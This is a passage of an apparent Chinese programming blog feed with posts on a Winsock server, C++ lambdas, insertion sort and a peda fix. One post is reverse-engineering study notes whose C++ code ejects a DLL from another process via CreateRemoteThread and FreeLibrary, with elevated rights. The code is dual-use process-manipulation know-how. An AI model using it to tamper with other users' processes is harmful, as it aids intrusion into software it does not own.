cSocket;</span><br><span class="line">sockaddr_in caddr;</span><br><span class="line"><span class="type">int</span> addrSize = <span class="built_in">sizeof</span>(caddr);</span><br><span class="line">cSocket = <span class="built_in">accept</span>(sSocket, (SOCKADDR*)&amp;caddr, &amp;addrSize);</span><br><span class="line"><span class="keyword">if</span> (cSocket == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;接受连接失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(sSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> recvbuf[<span class="number">512</span>];</span><br><span class="line"><span class="type">int</span> bytesReceived;</span><br><span class="line"><span class="keyword">while</span> ((bytesReceived = <span class="built_in">recv</span>(cSocket, recvbuf, <span class="built_in">sizeof</span>(recvbuf) - <span class="number">1</span>, <span class="number">0</span>)) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">recvbuf[bytesReceived] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">std::cout &lt;&lt; recvbuf &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (bytesReceived == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;接收数据失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">closesocket</span>(cSocket);</span><br><span class="line"><span class="built_in">closesocket</span>(sSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">网络编程的基础:CS模型</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="开发" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/"/>
    
    <category term="语言学习" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="网络编程" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
    <category term="CPP" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/CPP/"/>
    
    <category term="网络编程" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/CPP/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="cpp" scheme="https://www.pri87.vip/tags/cpp/"/>
    
    <category term="网络" scheme="https://www.pri87.vip/tags/%E7%BD%91%E7%BB%9C/"/>
    
    <category term="cs" scheme="https://www.pri87.vip/tags/cs/"/>
    
  </entry>
  
  <entry>
    <title>Pwn peda from six.moves import range报错修复</title>
    <link href="https://www.pri87.vip/posts/4aa563d5.html"/>
    <id>https://www.pri87.vip/posts/4aa563d5.html</id>
    <published>2024-12-08T17:42:02.000Z</published>
    <updated>2024-12-08T17:51:33.755Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://windeskybb.work/archives/16df477d-d5a8-4ea5-b5f9-d3b0bde9af07">kali系统安装gdb及其插件Peda|pwndbg|gef | 小风风のblog</a></p>]]></content>
    
    
    <summary type="html">修bugQAQ</summary>
    
    
    
    
    <category term="实践" scheme="https://www.pri87.vip/tags/%E5%AE%9E%E8%B7%B5/"/>
    
    <category term="记录" scheme="https://www.pri87.vip/tags/%E8%AE%B0%E5%BD%95/"/>
    
    <category term="日常" scheme="https://www.pri87.vip/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>《逆核》08-DLL卸载</title>
    <link href="https://www.pri87.vip/posts/382e9cc4.html"/>
    <id>https://www.pri87.vip/posts/382e9cc4.html</id>
    <published>2024-11-27T03:26:46.000Z</published>
    <updated>2025-01-01T10:44:18.139Z</updated>
    
    <content type="html"><![CDATA[<p>这一篇拖了比较久，因为之前不理解进程的权限令牌的作用，看逆向工程核心原理的时候发现注入不需要权限但是卸载却需要，书里面还没详细说，就一直搁置了，前几周学了APC注入，才知道进程权限完全就是试的，如果遇到0x5访问权限冲突，那就提升权限就好了。</p><p>给予vs编译的exe默认请求admin权限</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目-属性-链接器-清单文件-uac执行级别-requireAdministrator</span><br></pre></td></tr></table></figure><h2 id="DLL卸载"><a href="#DLL卸载" class="headerlink" title="DLL卸载"></a>DLL卸载</h2><p>DLL之前注入后，再次注入就不会触发attch效果了，如果不想重开进程就需要先卸载之后再注入。另一方面，如果想要让DLL执行完之后就立即卸载（即时效果）也许要卸载它。</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>找到进程-&gt;找进程模块-&gt;匹配相同的模块名-&gt;执行FreeLibrary</p><p>看书的时候发现FreeLibrary没有W且需要传入对应的句柄而不是指针</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">Injector::isLoaded</span><span class="params">(DWORD pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hModule = <span class="literal">nullptr</span>;</span><br><span class="line">HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE, pid);</span><br><span class="line"><span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE || hSnapshot == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;创建快照失败&quot;</span>);</span><br><span class="line">MODULEENTRY32 me;</span><br><span class="line">me.dwSize = <span class="built_in">sizeof</span>(MODULEENTRY32);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Module32First</span>(hSnapshot, &amp;me)) &#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!_wcsicmp(<span class="built_in">PathFindFileNameW</span>(DLLpath), me.szModule) &amp;&amp;</span><br><span class="line">!_wcsicmp(DLLpath, me.szExePath)) &#123;</span><br><span class="line">hModule = me.hModule;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Module32Next</span>(hSnapshot, &amp;me));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line"><span class="keyword">return</span> hModule;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Injector::eject</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> pfreelibrary = (LPTHREAD_START_ROUTINE)<span class="built_in">ModuleFuncLoader</span>(<span class="string">&quot;kernel32&quot;</span>, <span class="string">&quot;FreeLibrary&quot;</span>).<span class="built_in">func</span>();</span><br><span class="line">std::string findMode;</span><br><span class="line">std::cin &gt;&gt; findMode;</span><br><span class="line"><span class="built_in">toLowerCase</span>(findMode);</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (findMode == <span class="string">&quot;pid&quot;</span>) &#123;</span><br><span class="line">DWORD pid;</span><br><span class="line">std::cin &gt;&gt; pid;</span><br><span class="line">hProcess = <span class="built_in">findtargetHandle</span>(pid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (findMode == <span class="string">&quot;name&quot;</span>) &#123;</span><br><span class="line">std::wstring name;</span><br><span class="line">std::wcin &gt;&gt; name;</span><br><span class="line">LPCWSTR lname = name.<span class="built_in">c_str</span>();</span><br><span class="line">hProcess = <span class="built_in">findtargetHandle</span>(lname);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!hProcess)</span><br><span class="line"><span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;模式匹配失败&quot;</span>);</span><br><span class="line"></span><br><span class="line">DWORD pid = <span class="built_in">GetProcessId</span>(hProcess);</span><br><span class="line">HANDLE hModule = <span class="built_in">isLoaded</span>(pid);</span><br><span class="line"><span class="keyword">if</span> (hModule == INVALID_HANDLE_VALUE || hModule == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;目标进程 &quot;</span> &lt;&lt; pid &lt;&lt; <span class="string">&quot; 没有该模块&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pfreelibrary, hModule, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line"><span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;远程线程创建失败&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hModule);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">拖了好久</summary>
    
    
    
    <category term="逆向工程核心原理" scheme="https://www.pri87.vip/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="技能" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="DLL注入" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/DLL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="windows" scheme="https://www.pri87.vip/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>CPP-lambda表达式</title>
    <link href="https://www.pri87.vip/posts/10c328b5.html"/>
    <id>https://www.pri87.vip/posts/10c328b5.html</id>
    <published>2024-11-25T07:06:08.000Z</published>
    <updated>2024-11-25T16:54:06.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h1><h2 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h2><p>在面向对象中用表达式声明和定义一个函数，使其可以捕获上层函数的变量，实现闭包。或是定义只能在某个函数中使用的匿名函数</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[capture list] (parameter list) [mutable/<span class="keyword">exception</span>/attribute] -&gt; <span class="keyword">return</span> <span class="keyword">type</span> <span class="type">&#123; </span><span class="keyword">function</span> <span class="title">body</span> &#125;</span><br></pre></td></tr></table></figure><ul><li>capture list：捕获列表<ul><li>值捕获，定义时直接传值</li><li>引用捕获，内部使用的是对应变量的引用</li><li>隐式捕获，捕获所有外部变量，&#x3D;表示值捕获，&amp;表示引用捕获</li><li>初始化捕获，捕获列表中可以定义变量，且可以自动auto</li></ul></li><li>parameter list：传入参数列表，同普通的函数</li><li>[mutable&#x2F;exception&#x2F;attribute]：不加mutable会自动给按值捕获的变量加const</li><li>type：返回类型，省略后自动推导</li><li>function body：函数体</li></ul><h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>自定义排序算法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span>(arr,[](<span class="type">int</span> a,<span class="type">int</span> b)&#123;<span class="keyword">return</span> a&gt;b;&#125;);</span><br></pre></td></tr></table></figure><p>auto泛型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> f = [] (<span class="keyword">auto</span> x) -&gt; <span class="keyword">auto</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_integral&lt;<span class="keyword">decltype</span>(x)&gt;::value)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> x * <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (is_floating_point&lt;<span class="keyword">decltype</span>(x)&gt;::value)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> x / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>捕获类中的成员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> func = [*<span class="keyword">this</span>]()&#123;<span class="keyword">return</span> <span class="number">2</span>*num;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/m0_60134435/article/details/136151698">深入浅出 C++ Lambda表达式：语法、特点和应用_c++ lamda 参数-CSDN博客</a></p><p>Lambda表达式虽然是一种语法糖，但它本质上也是一种函数对象，也就是重载了 <code>operator()</code> 的类的对象。每一个 Lambda表达式都对应一个唯一的匿名类，这个类的名称由编译器自动生成，因此我们无法直接获取或使用。Lambda表达式的捕获列表实际上是匿名类的数据成员，Lambda表达式的参数列表和返回值类型实际上是匿名类的 <code>operator()</code> 的参数列表和返回值类型，Lambda表达式的函数体实际上是匿名类的 <code>operator()</code> 的函数体。例如，下面的 Lambda表达式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">auto</span> f = [x] (<span class="type">int</span> y) -&gt; <span class="type">int</span> &#123; <span class="keyword">return</span> x + y; &#125;;</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure><p>相当于定义了一个匿名类，类似于：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">__lambda_1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    __lambda_1(<span class="type">int</span> x) : __x(x) &#123;&#125; <span class="comment">// 构造函数，用于初始化捕获的变量</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="type">int</span> y)</span> <span class="type">const</span> <span class="comment">// 重载的 operator()，用于调用 Lambda表达式</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __x + y; <span class="comment">// 函数体，与 Lambda表达式的函数体相同</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> __x; <span class="comment">// 数据成员，用于存储捕获的变量</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">auto</span> f = __lambda_1(x); <span class="comment">// 创建一个匿名类的对象，相当于 Lambda表达式</span></span><br><span class="line"><span class="number">12345678910111213</span></span><br></pre></td></tr></table></figure><p>由于 Lambda表达式是一种函数对象，因此它可以赋值给一个合适的函数指针或函数引用，也可以作为模板参数传递给一个泛型函数或类。</p><p>参考</p><p><a href="https://zhuanlan.zhihu.com/p/150554945">现代 C++：Lambda 表达式 - 知乎</a></p>]]></content>
    
    
    <summary type="html">CPP学习</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="开发" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/"/>
    
    <category term="语言学习" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CPP" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/CPP/"/>
    
    <category term="语法" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/CPP/%E8%AF%AD%E6%B3%95/"/>
    
    
    <category term="cpp" scheme="https://www.pri87.vip/tags/cpp/"/>
    
    <category term="闭包" scheme="https://www.pri87.vip/tags/%E9%97%AD%E5%8C%85/"/>
    
  </entry>
  
  <entry>
    <title>基本排序算法</title>
    <link href="https://www.pri87.vip/posts/981a96f7.html"/>
    <id>https://www.pri87.vip/posts/981a96f7.html</id>
    <published>2024-11-19T02:19:38.000Z</published>
    <updated>2024-12-15T12:05:50.702Z</updated>
    
    <content type="html"><![CDATA[<h1 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h1><p> 插入排序是指每次排序的元素插入到已排序的列表中，和洗扑克牌一样。对于顺序表，插入所花时间很多。</p><h2 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h2><p>从左到右选择元素插入到已排序列表，插入时保证使已排序列表依然有序。初始已排序列表为空</p><p>基本算法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">insertionSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> j = i;</span><br><span class="line"><span class="keyword">auto</span> tmp = arr[i];</span><br><span class="line"><span class="keyword">while</span> (j != <span class="number">0</span> &amp;&amp; arr[j - <span class="number">1</span>] &gt; tmp) &#123;<span class="comment">//找到该插入的位置，并同时后一一位</span></span><br><span class="line">arr[j] = arr[j - <span class="number">1</span>];</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">arr[j] = tmp;<span class="comment">//插入</span></span><br><span class="line"><span class="built_in">pArr</span>(arr, len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Container&gt;</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">insertionSort</span><span class="params">(Container&amp; container)</span> </span>&#123;</span><br><span class="line"><span class="keyword">auto</span> first = std::<span class="built_in">begin</span>(container);</span><br><span class="line"><span class="keyword">auto</span> end = std::<span class="built_in">end</span>(container);</span><br><span class="line"><span class="keyword">if</span> (first == end) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = std::<span class="built_in">next</span>(first); i != end; i++) &#123;</span><br><span class="line"><span class="keyword">auto</span> key = *i;</span><br><span class="line"><span class="keyword">auto</span> j = i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (j != first &amp;&amp; (*std::<span class="built_in">prev</span>(j) &gt; key)) &#123;</span><br><span class="line">*j = *std::<span class="built_in">prev</span>(j);</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">*j = key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00060332</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">6</span>.<span class="number">03324770</span></span><br></pre></td></tr></table></figure><p>直接插入排序有两个循环，所以一般情况下时间复杂度是$O(n)*O(n)&#x3D;O(n^2)$，最坏的情况是完全逆序，与平均相同，最好情况为顺序，内循环不需要比较，所以时间复杂度为$O(n)$<br>对于空间复杂度，需要额外空间存放一个元素，所以是$O(1)$</p><h2 id="二分插入排序"><a href="#二分插入排序" class="headerlink" title="二分插入排序"></a>二分插入排序</h2><p>也叫折半插入排序，直接插入排序使用了顺序查找，效率较低，所以把顺序查找换成二分查找能提高内循环效率，然而还是插入，感觉没有提高多少效率</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">binaryInsertionSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> high = i;</span><br><span class="line"><span class="keyword">auto</span> low = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">auto</span> mid = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">auto</span> tmp = arr[i];</span><br><span class="line"><span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">mid = (low + high) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (arr[mid] &lt; tmp) &#123;</span><br><span class="line">low = mid + <span class="number">1</span>;<span class="comment">//防止len=2时卡死？</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (arr[mid] &gt; tmp) &#123;</span><br><span class="line">high = mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (arr[mid] == tmp) &#123;</span><br><span class="line">high = low = mid;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i; j &gt; low; --j)<span class="comment">//只移动</span></span><br><span class="line">&#123;</span><br><span class="line">arr[j] = arr[j - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">arr[low] = tmp;<span class="comment">//插入</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">pArr</span>(arr, len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Container&gt;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">binaryInsertionSort</span><span class="params">(Container&amp; container)</span> </span>&#123;</span><br><span class="line"><span class="keyword">auto</span> first = std::<span class="built_in">begin</span>(container);</span><br><span class="line"><span class="keyword">auto</span> end = std::<span class="built_in">end</span>(container);</span><br><span class="line"><span class="keyword">if</span> (first == end) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = std::<span class="built_in">next</span>(first); i != end; ++i) &#123;</span><br><span class="line"><span class="keyword">auto</span> high = i;</span><br><span class="line"><span class="keyword">auto</span> low = first;</span><br><span class="line"><span class="keyword">auto</span> mid = first;</span><br><span class="line"><span class="keyword">auto</span> tmp = *i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">mid = low;</span><br><span class="line">std::<span 